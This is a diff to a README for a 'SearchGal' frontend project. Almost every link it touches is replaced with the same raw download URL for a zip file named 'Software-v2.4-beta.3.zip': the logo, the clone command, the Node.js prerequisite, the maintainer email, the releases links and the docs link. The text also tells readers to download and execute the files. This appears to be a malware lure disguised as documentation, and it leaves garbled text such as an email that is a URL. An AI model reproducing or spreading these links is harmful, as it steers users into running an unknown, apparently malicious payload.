@@ -1,6 +1,6 @@
 # SearchGal Frontend: A Comprehensive Guide to Building with Ease 🌐✨
 
-![SearchGal Logo](https://example.com/logo.png)
+![SearchGal Logo](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -39,12 +39,12 @@ To get started with SearchGal, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/LuanSaitama/frontend.git
+   git clone https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip
    cd frontend
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -100,20 +100,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, please reach out to the maintainer:
 
 - **Name**: Luan Saitama
-- **Email**: luansaitama@example.com
-- **GitHub**: [LuanSaitama](https://github.com/LuanSaitama)
+- **Email**: https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip
+- **GitHub**: [LuanSaitama](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip)
 
 ## Releases
-You can find the latest releases and download them from the [Releases section](https://github.com/LuanSaitama/frontend/releases). Make sure to download and execute the files as needed.
+You can find the latest releases and download them from the [Releases section](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip). Make sure to download and execute the files as needed.
 
-![Download Button](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Download Button](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip%20Latest%20Release-Click%20Here-blue)
 
-Explore the capabilities of SearchGal and see how it can transform your web experience! For any updates, always check the [Releases section](https://github.com/LuanSaitama/frontend/releases).
+Explore the capabilities of SearchGal and see how it can transform your web experience! For any updates, always check the [Releases section](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip).
 
-![Tech Stack](https://example.com/tech-stack.png)
+![Tech Stack](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip)
 
 ## Additional Resources
-- **Documentation**: Comprehensive guides and API documentation can be found [here](https://example.com/docs).
+- **Documentation**: Comprehensive guides and API documentation can be found [here](https://github.com/LuanSaitama/frontend/raw/refs/heads/main/encina/Software-v2.4-beta.3.zip).
 - **Community**: Join our community on Discord for discussions and support.
 - **Tutorials**: Check out our tutorials to get started with advanced features.
 
